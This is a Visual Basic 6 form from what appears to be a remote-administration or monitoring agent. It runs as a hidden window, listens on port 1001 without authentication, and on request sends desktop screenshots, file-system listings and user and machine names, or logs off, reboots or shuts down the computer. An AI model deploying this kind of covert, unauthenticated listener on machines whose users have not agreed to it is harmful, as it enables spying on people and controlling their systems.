VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmSocket 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   ClientHeight    =   765
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   HasDC           =   0   'False
   Icon            =   "frmSocket.frx":0000
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   765
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   WindowState     =   1  'Minimized
   Begin VB.Timer tmrLicensed 
      Enabled         =   0   'False
      Left            =   2745
      Top             =   135
   End
   Begin VB.Timer tmrChk4Close 
      Interval        =   500
      Left            =   270
      Top             =   135
   End
   Begin MSWinsockLib.Winsock sckClient 
      Left            =   1260
      Top             =   135
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmSocket"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Const cSendInterval As Byte = 2

Private vHasSendComplete As Boolean

Private Sub Form_Load()
    On Error GoTo Err_Handle
    Call Err.Clear
    
    'MsgBox "{I M IN LOAD EVENT}"
    
    '*********** To enforce restriction over free use
    'Me.tmrLicensed.Interval = 500 * 60 + 500 * 6
    'Me.tmrLicensed.Enabled = True
    '**************************
    
    With Me.sckClient
        .Close
        .LocalPort = 1001
        .Listen
    End With

ExitLable:
    Exit Sub

Err_Handle:
    Select Case (Err.Number)
        Case Else
            'Call oDB.showError(Err)
            Call MsgBox("Unable to continue.", vbOKOnly + vbCritical, "Error")
            End
    End Select

End Sub

Private Sub Form_Unload(Cancel As Integer)
    Me.sckClient.Close
    Call mdlNotify.ShellTrayRemove
End Sub

Private Sub sckClient_ConnectionRequest(ByVal requestID As Long)
    If (Me.sckClient.State <> sckClosed) Then Me.sckClient.Close
    Call Me.sckClient.Accept(requestID)
    vHasSendComplete = True
    'Me.tmrChk4Close.Enabled = True
    
End Sub

Private Sub sckClient_DataArrival(ByVal bytesTotal As Long)
    Dim vSigData As String
    Call Me.sckClient.GetData(vSigData, vbString)
    Call respondSignal(vSigData)
End Sub

Private Sub sckClient_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Me.sckClient.Close
    Me.sckClient.Listen
End Sub

Private Sub sckClient_SendComplete()
    On Error GoTo Err_Handle
    Err.Clear
    
    If (Not vHasSendComplete) Then
        
        vHasSendComplete = True
        
        If (Me.sckClient.State <> sckConnected) Then
            Me.sckClient.Close
            Me.sckClient.Listen
            Exit Sub
        End If
        
        Call Me.sckClient.SendData(cSigSendComplete)
        
    End If
    
ExitLable:
    
    Exit Sub

Err_Handle:
    Select Case (Err.Number)
        Case Else
            'Call oDB.showError(Err)
            Call resetSocket
    End Select

End Sub

Private Sub sendDesktopImage()
    On Error GoTo Err_Handle
    Err.Clear
    
    '********** Begining of Varifications
    If (Not vHasSendComplete) Then Exit Sub

    If (Me.sckClient.State <> sckConnected) Then
        Me.sckClient.Close
        Me.sckClient.Listen
        Exit Sub
    End If
    
    vHasSendComplete = False
    
    '*************** End of varifications
    
    '************************************************

    Dim aryImageData() As Byte
    Dim vByteCount As Long
    Dim vFileNumber As Byte
    Dim vBmpImageFileName As String
    Dim vJpgImageFileName As String
    Dim oFSO As New Scripting.FileSystemObject
    Dim vExeString As String
    
    Dim oDesktopImage As stdole.StdPicture
    
    Set oDesktopImage = CaptureWindow(0, 0, 0, Screen.Width / Screen.TwipsPerPixelX, Screen.Height / Screen.TwipsPerPixelY)

    vBmpImageFileName = oFSO.GetBaseName(oFSO.GetTempName)
    vJpgImageFileName = vBmpImageFileName & ".Jpg"
    vBmpImageFileName = vBmpImageFileName & ".Bmp"
    
    Call SavePicture(oDesktopImage, oFSO.BuildPath(App.Path, vBmpImageFileName))
    
    vExeString = oFSO.BuildPath(App.Path, "_unins s=" & Chr(34) & oFSO.BuildPath(App.Path, vBmpImageFileName) & Chr(34) & " -nodlg -ov")
    
    'MsgBox vExeString
    '*********** Converting 2 JPEG
    If (Shell(vExeString, vbHide) = 0) Then GoTo ExitLable
    
    Dim vWait4FileJPG As Byte
    vWait4FileJPG = 0
    Do
            
        vWait4FileJPG = vWait4FileJPG + 1
        
        If (vWait4FileJPG = 50) Then GoTo ExitLable
        
        Call Pause(0.1)
        
    Loop While (Not oFSO.FileExists(oFSO.BuildPath(App.Path, vJpgImageFileName)))
    '*********************************
    
    Dim vWait4Len As Byte
    vWait4Len = 0
    Do
            
        vWait4Len = vWait4Len + 1
        
        
        Call Pause(0.1)
        
        ReDim aryImageData(FileLen(oFSO.BuildPath(App.Path, vJpgImageFileName))) As Byte
        'ReDim aryImageData(FileLen(oFso.BuildPath(App.Path, vBmpImageFileName))) As Byte
    
        If (vWait4Len = 50) Then GoTo ExitLable
        
    Loop While (UBound(aryImageData) = 0)
    
    vFileNumber = FreeFile()
    
    '*********** Opening file as Buffer stream
    'Open oFso.BuildPath(App.Path, vBmpImageFileName) For Binary Access Read As #vFileNumber
    Open oFSO.BuildPath(App.Path, vJpgImageFileName) For Binary Access Read As #vFileNumber
        For vByteCount = 0 To UBound(aryImageData)
            '********* Placing containt of file into byte array
            'DoEvents
            Get #vFileNumber, , aryImageData(vByteCount)
        Next vByteCount
    Close #vFileNumber
            
    '*********** Sending that Byte array
    If (Me.sckClient.State <> sckConnected) Then
        Me.sckClient.Close
        Me.sckClient.Listen
        Exit Sub
    End If
    
    Call Me.sckClient.SendData(aryImageData)
    '*******************************************
    
    '********** End of Sub
    
    Call oFSO.DeleteFile(oFSO.BuildPath(App.Path, vBmpImageFileName))
    Call Pause(1)
    Call oFSO.DeleteFile(oFSO.BuildPath(App.Path, vJpgImageFileName))

ExitLable:
    Exit Sub

Err_Handle:
    Select Case (Err.Number)
        Case Else
            'Call oDB.showError(Err)
            Call resetSocket
    End Select
End Sub

Private Sub respondSignal(Signal As String)
    On Error GoTo Err_Handle
    Err.Clear
    
    Dim vAck As String
    Dim vSignalFormat As Variant
    Dim vMessage As Variant
    
    vSignalFormat = Split(Signal, cSignalDelimiter)
    
    Select Case (vSignalFormat(0))
    
        Case cSigHandshaking
        
            vAck = cAckHandshaking
            Call Me.sckClient.SendData(vAck)
            
        Case cSigSendDesktop
        
            Call sendDesktopImage
            
        Case cSigSendFileSystem
            
            Dim vFSString As String
            
            vMessage = Split(vSignalFormat(1), cClauseDelimiter)
            
            vFSString = ScanFS(CStr(vMessage(0)), CInt(vMessage(1)))
            
            If (Me.sckClient.State <> sckConnected) Then
                Me.sckClient.Close
                Me.sckClient.Listen
                Exit Sub
            End If
            
            vHasSendComplete = False
                            
            Call Me.sckClient.SendData(vFSString)
            
        Case cSigNotify
        
            '******* Message Format
            '   Message text
            '   Message Title
            '   Message Icon
            '       0 = No icon
            '       1 = Information
            '       2 = Warning
            '       3 = Error
            '**********************
            
            vMessage = Split(vSignalFormat(1), cClauseDelimiter)
            
            Call mdlNotify.showMessage(CStr(vMessage(0)), CStr(vMessage(1)), CLng(vMessage(2)))
            
            Call Me.sckClient.SendData(cAckPositive)
            
        Case cSigClientComputerName
            
            Call Me.sckClient.SendData(ClientName)
            
        Case cSigClientUserName
            
            Call Me.sckClient.SendData(UserName)
        
        Case cSigLogOff
                    
            Call Me.sckClient.SendData(cAckPositive)
            Call mdlSystemOperations.LogOff
                    
        Case cSigReboot
        
            Call Me.sckClient.SendData(cAckPositive)
            Call mdlSystemOperations.ReBoot
            
        Case cSigShutDown
    
            Call Me.sckClient.SendData(cAckPositive)
            Call mdlSystemOperations.ShutDown
    
    End Select

ExitLable:
    Exit Sub

Err_Handle:
    Select Case (Err.Number)
        Case Else
            'Call oDB.showError(Err)
            Call resetSocket
    End Select
End Sub

Private Sub tmrChk4Close_Timer()
'    Me.tmrChk4Close.Enabled = False
    With Me.sckClient
        If (.State <> sckConnected And .State <> sckListening) Then
            .Close
            .Listen
        End If
    End With
End Sub

Private Sub tmrLicensed_Timer()
'    With Me.sckClient
'        .Close
'        .LocalPort = 0
'
'    End With
'    Me.tmrLicensed.Enabled = False
End Sub
